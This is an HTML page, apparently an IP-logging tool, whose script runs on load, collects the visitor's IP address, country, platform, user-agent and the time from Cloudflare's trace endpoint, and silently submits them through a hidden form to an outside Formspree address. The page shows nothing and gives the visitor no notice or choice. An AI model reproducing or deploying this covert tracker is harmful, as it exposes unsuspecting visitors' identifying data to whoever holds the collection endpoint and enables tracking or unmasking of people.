<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Log IP and Device Info</title>
</head>
<body>
  <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
    <input type="hidden" name="ip_info" id="ipInfo">
  </form>

  <script>
    async function getInfo() {
      try {
        // Gọi Cloudflare trace - không bị CORS, không cần token
        const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
        const text = await res.text();

        const data = {};
        text.trim().split('\n').forEach(line => {
          const [key, value] = line.split('=');
          data[key] = value;
        });

        const ip = data.ip || 'Unknown';
        const loc = data.loc || 'Unknown'; // Country
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        const now = new Date().toLocaleString();

        const content = `
🔐 IP Address: ${ip}

📍 Location:
- Country: ${loc} (from Cloudflare)

💻 Device:
- Platform: ${platform}
- User-Agent: ${ua}

🕒 Time: ${now}
        `.trim();

        document.getElementById('ipInfo').value = content;
        document.getElementById('ipForm').submit();
      } catch (err) {
        console.error('Error fetching IP info:', err);
      }
    }

    getInfo();
  </script>
</body>
</html>
